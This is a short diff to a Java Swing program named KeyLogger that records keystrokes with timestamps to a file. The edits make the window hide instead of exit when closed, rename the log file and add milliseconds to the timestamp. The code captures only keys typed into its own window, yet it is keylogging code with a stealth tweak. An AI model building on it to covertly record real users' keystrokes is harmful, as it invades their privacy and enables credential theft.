@@ -10,7 +10,7 @@ class KeyLogger extends JFrame implements KeyListener{
 
     public KeyLogger(){
         setTitle("HIDDEN");
-        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+        setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
         addKeyListener(this);
         setFocusable(true);
         setVisible(true);
@@ -25,7 +25,7 @@ class KeyLogger extends JFrame implements KeyListener{
 
     private static void writetofile(String output){
         try{
-            FileWriter myWriter = new FileWriter("filename.txt", true); // call the file to write to
+            FileWriter myWriter = new FileWriter("output.txt"); // call the file to write to
             myWriter.append(output); // add output to file
             myWriter.close();
             }catch(IOException e){ // print the error
@@ -35,11 +35,11 @@ class KeyLogger extends JFrame implements KeyListener{
     }
     private static String time(){
         LocalDateTime myDateTime = LocalDateTime.now(); // call the full date down to the sec
-        DateTimeFormatter myDateTimeFormatter = DateTimeFormatter.ofPattern("dd-MM-yyyy HH:mm:ss"); // format the date to desired outcome
+        DateTimeFormatter myDateTimeFormatter = DateTimeFormatter.ofPattern("dd-MM-yyyy HH:mm:ss.SSS"); // format the date to desired outcome
         return myDateTime.format(myDateTimeFormatter); // return formatted date
     }
     public static void main(String[] args) {
-        new KeyLogger();
+        new KeyLogger(); // start the keylogger
     }
 
 
